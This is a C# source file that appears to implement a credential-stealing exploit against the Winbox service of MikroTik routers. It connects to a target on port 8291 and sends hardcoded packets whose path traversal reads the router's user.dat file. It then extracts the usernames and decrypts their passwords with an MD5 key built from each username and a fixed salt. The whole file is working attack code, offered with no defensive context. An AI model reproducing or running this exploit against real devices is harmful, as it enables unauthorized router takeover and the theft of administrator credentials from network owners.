using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;

namespace MST.MikroTik.WinboxExploit
{
    public static class WinboxExploitManager
    {
        private static int BUFFER_SIZE = 1024;

        static readonly byte[] a = new byte[] {
            0x68, 0x01, 0x00, 0x66, 0x4d, 0x32, 0x05, 0x00,
            0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x05, 0x07,
            0x00, 0xff, 0x09, 0x07, 0x01, 0x00, 0x00, 0x21,
            0x35, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2e, 0x2f,
            0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f,
            0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f,
            0x2f, 0x2f, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x66,
            0x6c, 0x61, 0x73, 0x68, 0x2f, 0x72, 0x77, 0x2f,
            0x73, 0x74, 0x6f, 0x72, 0x65, 0x2f, 0x75, 0x73,
            0x65, 0x72, 0x2e, 0x64, 0x61, 0x74, 0x02, 0x00,
            0xff, 0x88, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0x88,
            0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00,
            0x00, 0x00
        };
        
        public static IEnumerable<User> Run(string ipAddress, int port = 8291)
        {
            IPAddress dstAddress = IPAddress.Parse(ipAddress);

            byte[] receivedBytes = new byte[BUFFER_SIZE];
            using (var sender = new Socket(dstAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp))
            {
                sender.ReceiveTimeout = 3000;
                sender.SendTimeout = 3000;

                sender.Connect(new IPEndPoint(dstAddress, port));
                sender.Send(a);

                receivedBytes = new byte[BUFFER_SIZE];
                sender.Receive(receivedBytes, BUFFER_SIZE, SocketFlags.None);

                byte[] b = new byte[]
                {
                    0x3b, 0x01, 0x00, 0x39, 0x4d, 0x32, 0x05, 0x00,
                    0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x06, 0x01,
                    0x00, 0xfe, 0x09, 0x35, 0x02, 0x00, 0x00, 0x08,
                    0x00, 0x80, 0x00, 0x00, 0x07, 0x00, 0xff, 0x09,
                    0x04, 0x02, 0x00, 0xff, 0x88, 0x02, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01,
                    0x00, 0xff, 0x88, 0x02, 0x00, 0x02, 0x00, 0x00,
                    0x00, 0x02, 0x00, 0x00, 0x00
                };
                b[19] = receivedBytes[38];
                sender.Send(b);

                receivedBytes = new byte[BUFFER_SIZE];
                sender.Receive(receivedBytes, BUFFER_SIZE, SocketFlags.None);
            }

            receivedBytes = receivedBytes.Skip(55).ToArray();
            var entries = receivedBytes.Split(new byte[] { 0xff }).Skip(1).ToArray();

            var result = new List<User>();
            foreach (var entry in entries)
            {
                try
                {
                    #region extract_user_pass_from_entry
                    var userData = entry.Split(new byte[] { 0x01, 0x00, 0x00, 0x21 })[1];
                    var passData = entry.Split(new byte[] { 0x11, 0x00, 0x00, 0x21 })[1];

                    int userLen = userData[0];
                    int passLen = passData[0];

                    var userBytes = userData.Skip(1).Take(userLen).ToArray();
                    var passBytes = passData.Skip(1).Take(passLen).ToArray();
                    #endregion extract_user_pass_from_entry                    

                    #region decrypt_password
                    byte[] keyBytes = userBytes.Concat(Encoding.ASCII.GetBytes("283i4jfkai3389")).ToArray();
                    byte[] key = MD5.Create().ComputeHash(keyBytes);

                    string password = string.Empty;
                    for (int i = 0; i < passBytes.Length; i++)
                    {
                        password += (char)(passBytes[i] ^ key[i % key.Length]);
                    }
                    #endregion decrypt_password

                    var username = Encoding.ASCII.GetString(userBytes);
                    result.Add(new User(username, password));
                }
                catch
                {
                    continue;
                }
            }

            return result;
        }

    }
}